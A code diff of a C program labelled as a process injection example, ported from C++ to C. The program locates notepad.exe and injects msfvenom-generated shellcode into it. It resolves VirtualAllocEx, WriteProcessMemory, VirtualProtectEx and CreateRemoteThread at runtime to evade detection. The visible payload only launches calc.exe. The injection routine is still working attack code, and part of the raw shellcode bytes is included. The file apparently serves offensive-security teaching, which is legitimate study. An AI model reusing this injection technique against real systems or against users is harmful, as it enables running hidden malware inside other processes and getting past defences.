@@ -1,10 +1,11 @@
 /*
 * Process injection example 4: injecting calc.exe msfvenom shellcode into a remote process using dynamic function resolution
 * shellcode: msfvenom -p windows/x64/exec CMD=calc.exe -f C EXITFUNC=thread
-* compile: cl.exe injection-example-4.cpp  /D"_UNICODE" /D"UNICODE" /W0
+* compile: cl.exe injection-example-4.c  /D"_UNICODE" /D"UNICODE" /W0
 */
 #include <windows.h>
 #include <stdio.h>
+#include <stdbool.h>
 #include <tlhelp32.h>
 
 // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
@@ -46,27 +47,30 @@ typedef HANDLE(WINAPI* P_CreateRemoteThread) (
 );
 
 // Adapted from Pavel Yosifovich's Enumerate Processes (part 1): https://www.youtube.com/watch?v=IZULG6I4z5U
-DWORD FindPidByName(LPCWSTR processName) {
-    DWORD foundpid = 0;
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        return foundpid;
+DWORD FindPidByName(const wchar_t* processName) {
+    DWORD pid = 0;
+    // Force the Wide-character version of the struct
+    PROCESSENTRY32W entry; 
+    entry.dwSize = sizeof(PROCESSENTRY32W);
+
+    // Create a snapshot of the system processes
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    if (snapshot != INVALID_HANDLE_VALUE) {
+        // Force the Wide-character version of the API
+        if (Process32FirstW(snapshot, &entry)) {
+            do {
+                // Now both sides are Wide strings, so _wcsicmp works!
+                //if (_wcsicmp(processName, entry.szExeFile) == 0) {
+                if (lstrcmpiW(processName, entry.szExeFile) == 0) {
+                    pid = entry.th32ProcessID;
+                    break;
+                }
+            } while (Process32NextW(snapshot, &entry));
+        }
+        CloseHandle(snapshot);
     }
-
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(PROCESSENTRY32);
-
-    if (Process32First(hSnapshot, &pe)) {
-        do {
-            if (_wcsicmp(processName, pe.szExeFile) == 0) {
-                foundpid = pe.th32ProcessID;
-                break;
-            }
-        } while (Process32Next(hSnapshot, &pe));
-    }
-
-    CloseHandle(hSnapshot);
-    return foundpid;
+    return pid;
 }
 
 int main() {
@@ -93,10 +97,10 @@ int main() {
         "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
         "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
 
-    P_VirtualAllocEx myVirtualAllocEx = nullptr;
-    P_WriteProcessMemory myWriteProcessMemory = nullptr;
-    P_VirtualProtectEx myVirtualProtectEx = nullptr;
-    P_CreateRemoteThread myCreateRemoteThread = nullptr;
+    P_VirtualAllocEx myVirtualAllocEx = NULL;
+    P_WriteProcessMemory myWriteProcessMemory = NULL;
+    P_VirtualProtectEx myVirtualProtectEx = NULL;
+    P_CreateRemoteThread myCreateRemoteThread = NULL;
 
     DWORD pid = 0;
     const wchar_t* processName = L"notepad.exe";
@@ -110,7 +114,7 @@ int main() {
     printf("[*] Running PI with target PID: %u\n", pid);
 
     // Open a handle to the current process, this must be passed to VirtualAllocEx
-    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (pHandle == NULL) {
         printf("Failed to acquire process handle!\n");
         return -1;
@@ -125,7 +129,7 @@ int main() {
 	
     // Use GetProcAddress to get the address of the VirtualAllocEx function
     myVirtualAllocEx = (P_VirtualAllocEx)GetProcAddress(hKernel32, "VirtualAllocEx");
-    if (myVirtualAllocEx == nullptr) {
+    if (myVirtualAllocEx == NULL) {
         printf("[ERROR] Failed to resolve VirtualAllocEx. Error: %u\n", GetLastError());
         FreeLibrary(hKernel32); // Clean up the module handle
         return -1;
@@ -133,7 +137,7 @@ int main() {
 
     // Use GetProcAddress to get the address of the WriteProcessMemory function
     myWriteProcessMemory = (P_WriteProcessMemory)GetProcAddress(hKernel32, "WriteProcessMemory");
-    if (myWriteProcessMemory == nullptr) {
+    if (myWriteProcessMemory == NULL) {
       printf("[ERROR] Failed to resolve WriteProcessMemory. Error: %u\n", GetLastError());
       FreeLibrary(hKernel32); // Clean up the module handle
       return -1;
@@ -141,7 +145,7 @@ int main() {
 
     // Use GetProcAddress to get the address of the VirtualProtectEx function
     myVirtualProtectEx = (P_VirtualProtectEx)GetProcAddress(hKernel32, "VirtualProtectEx");
-    if (myVirtualProtectEx == nullptr) {
+    if (myVirtualProtectEx == NULL) {
         printf("[ERROR] Failed to resolve VirtualProtectEx. Error: %u\n", GetLastError());
         FreeLibrary(hKernel32); // Clean up the module handle
         return -1;
@@ -149,7 +153,7 @@ int main() {
 
     // Use GetProcAddress to get the address of the CreateRemoteThread function
     myCreateRemoteThread = (P_CreateRemoteThread)GetProcAddress(hKernel32, "CreateRemoteThread");
-    if (myCreateRemoteThread == nullptr) {
+    if (myCreateRemoteThread == NULL) {
         printf("[ERROR] Failed to resolve CreateRemoteThread. Error: %u\n", GetLastError());
         FreeLibrary(hKernel32); // Clean up the module handle
         return -1;
